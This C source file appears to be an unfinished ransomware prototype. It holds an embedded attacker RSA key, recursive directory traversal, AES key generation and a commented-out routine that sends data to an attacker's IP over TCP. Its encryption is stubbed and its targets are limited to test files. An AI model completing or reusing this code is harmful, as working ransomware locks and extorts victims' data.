#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

//RSA-2048 attacker public key.
char* publicKey = "MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQ"
                  "KCAQBVsejWJHjJO/VCu+vJj6QklpPbZODP+A4e"
                  "2ZYOf4sGt+ce/7+AP9YKFmaWAXhd1LOb9mfzng"
                  "RCNGIzJBNOssNBPJXie5wT7EbXKJ1YsH/3Efnp5"
                  "7DEWaeLe/LwIUfe2+ufzNIZhCKDdKSItFaSQ0yO"
                  "4ylXU8SCp6HxCGbdTw0EXat2wEs2vXRRXxG06Ej"
                  "fMjwSEnygr0WKBAzHHYOFm6dNnlZyisYupd1a2l"
                  "D9Ip5w/6lh9z2RRz4BoX9GI3XHW4mm+qeW2aF3i"
                  "6QdI2mu8CnjQIPilqcKabx2jX7n8wHgf0rUcQyj"
                  "7b3nEo1fBhtQO29VgffawI8uQian7Tg8Vk7xAgMBAAE=";

EVP_CIPHER_CTX* dirEncryptContext = NULL;
unsigned char* dirEncryptKey = NULL;


int block_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
{

   /* EVP_CIPHER_CTX *ctx;

    int len;
    int outLength = plaintext_len;


    ctx = EVP_CIPHER_CTX_new();


    EVP_EncryptInit_ex(ctx,  EVP_aes_256_cbc(), NULL,key,iv);


    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);


    EVP_EncryptFinal_ex(ctx,ciphertext + outLength ,&outLength);


    EVP_CIPHER_CTX_free(ctx);


    return outLength;
    */
   return 0;
}

int sendMessageToAttacker(char* encryptedKey){

    /*int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(argv[1]);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    //connect to socket
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    // Get input from the user:
    size_t clientMsgSize = 100;
    unsigned char clientMessage[clientMsgSize];
    printf("Enter message sent to the server(100 char max): ");
    fgets(clientMessage, clientMsgSize, stdin);

    size_t cipherLength = clientMsgSize +16+1;
    unsigned char cipherText[cipherLength];

    int cipherLengthReal = block_encrypt(clientMessage, clientMsgSize, argv[2], argv[3], cipherText);

    cipherText[cipherLength] = 0;
    printf("Client sends cipher text:\n");
    printf( "%s\n",cipherText);


    // Send the message to server:
    ssize_t bytesSent = send(sockfd, cipherText, cipherLength, 0);
    if(bytesSent == -1) {
        printf("errorSending\n");
        return -1;
    }

    // Receive the server's response:
    size_t inputBufferLength = 100;
    char inputBuffer[inputBufferLength];
    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    if(bytesReceived == -1){
        printf("errorReceive\n");
        return -1;
    }
    else printf("Server says: %s\n", inputBuffer);

    // Close the socket:
    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }


     */
    return 0;

}

//assumes both char arrays have null terminator
char* concatStrings(char* str1, char* str2){

    int str1Len = 0;
    while(str1[str1Len] != 0){
        str1Len++;
    }
    int str2Len = 0;
    while(str2[str2Len] != 0){
        str2Len++;
    }

    //length of new string has one added to it to include new null terminator
    char* concat = (char*)malloc((str1Len + str2Len + 1) * sizeof(char));

    for(int i =0; i <str1Len; i++){
        concat[i] = str1[i];
    }
    for(int i =0; i < str2Len; i++){
        concat[i+str1Len] = str2[i];
    }
    concat[str1Len + str2Len] = 0;
    return concat;

}


int encryptFile(struct stat* entryInfo, char* fullPath, char* fileName){

    printf("encrypting file %s\n", fileName );
}

//returns 1 for yes, 0 for no
//these are some arbitrary conditions the file needs to have in order to be encrypted.
//mainly a safeguard to make sure it doesnt accidently go rogue.
int checkIfEncryptFile(char* fullPath, char* fileName){

    if(strstr(fileName, "malwareExample")){

        return 1;
    }
    else{
        return 0;
    }
}
int navigateUserDirectory(char* directoryPath){

    int len;
    int outLength = 0;
    int errorVal = 0;

    if(dirEncryptContext == NULL){

        dirEncryptContext = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(dirEncryptContext,  EVP_aes_256_cbc(), NULL,NULL,NULL);

        int keyLen = EVP_CIPHER_CTX_key_length(dirEncryptContext);
        printf("%i\n",keyLen);

        //key is not given a null terminating char, it is just a normal char array
        dirEncryptKey = (unsigned char*)malloc((keyLen) * sizeof(unsigned char));

        errorVal = EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);
        if(errorVal <1){
            printf("%s", "Error with symmetric key gen\n");
            return -1;

        }

    }

    DIR* userDir;
    if ((userDir = opendir(directoryPath)) == NULL) {
        perror("Cannot open path ");
        exit(1);
    }

    struct dirent* currentEntry = NULL;

    while ((currentEntry = readdir(userDir)) != NULL) {

        char* entryName = (*currentEntry).d_name;

        //ignore hidden dirs
        if((strcmp(entryName,".") == 0) || (strcmp(entryName,"..") == 0)) continue;

        char slash[2] = {'/',0};
        char* dirWithSlash = concatStrings(directoryPath,slash);
        char* fullPath = concatStrings(dirWithSlash, entryName);

        printf("%s\n", fullPath);

        struct stat entryInfo;
        if(stat(fullPath,&entryInfo) < 0){
            perror("Cannot open entry ");
            exit(1);
        }

        //S_IFMT is bit mask for file type, st_mode is mask for file type and some other info.
        int mask = entryInfo.st_mode & S_IFMT;
        if(mask == S_IFREG){
            printf("reg file\n");
            if(checkIfEncryptFile(fullPath,entryName)) encryptFile(&entryInfo,fullPath,entryName);

        }
        else{
            if(mask == S_IFDIR)printf("directory\n");
            //we only care about regular files, which we will encrypt, and directories,which we may recurse on.
        }

    }
    printf("null reached ");

    return 0;


}

int main(int argc, unsigned char** argv){

    printf("%s\n", argv[0]);
    printf("%s\n", argv[1]);
    navigateUserDirectory(argv[1]);



    return 0;

}
